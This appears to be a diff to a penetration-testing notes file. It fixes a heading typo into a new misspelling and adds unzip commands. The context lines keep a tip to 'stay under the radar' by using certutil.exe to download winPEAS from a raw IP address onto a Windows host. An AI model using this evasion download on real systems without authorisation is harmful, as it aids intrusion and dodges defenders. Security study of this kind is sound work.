@@ -95,7 +95,7 @@ Aux argument will provide all processes, and piping to grep filters.
 
 ---
 
-#### Adding Resositories
+#### Adding Rerositories
 
 Sources are stored in /etc/apt/sources.list. Let's say that a package isn't found, so you can't install new binaries or packages, you're likely missing the source location in which the binary or package is held. Modify the provided file to include the source you need.
 
@@ -288,4 +288,11 @@ When a version for ANYTHING is exposed or uncovered, DO NOT SKIP OVER THIS and s
 Stay under the radar and use certutil.exe on Windows to download files from the internet:
 ```bash
 certutil.exe -f -urlcache http://123.123.123.123/winPEASx64.exe winpeas.exe
+```
+
+#### Unzipping Files
+
+```bash
+unzip file.zip
+7z x file.zip
 ```
